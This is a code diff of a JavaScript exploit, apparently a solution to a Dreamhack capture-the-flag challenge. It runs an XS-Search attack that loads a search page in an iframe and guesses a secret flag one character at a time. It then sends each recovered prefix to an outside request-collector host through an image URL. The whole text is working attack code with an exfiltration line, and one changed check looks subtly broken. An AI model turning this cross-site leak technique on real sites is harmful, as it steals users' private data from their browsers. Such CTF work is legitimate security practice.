@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
+                if (iframe.contentWindow.querySelector('.sentence-list'))
                     return resolve();
                 else
                     return reject();
@@ -16,7 +16,7 @@
     async function search(query) {
         try {
             await req(
-              `http://127.0.0.1:8000/search?query=${query}`
+              `http://127.0.0.1:8000/search?keyword=${query}`
             );
             return true;
         } catch (e) {
@@ -24,13 +24,13 @@
         }
     }
     async function exploit() {
-        let chars = "0123456789abcdef"
+        let chars = "0123456789abcdef}"
         let secret = "DH{";
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://roaiaro.request.dreamhack.games/${secret}`;
+                    img.src = `https://oewybdz.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
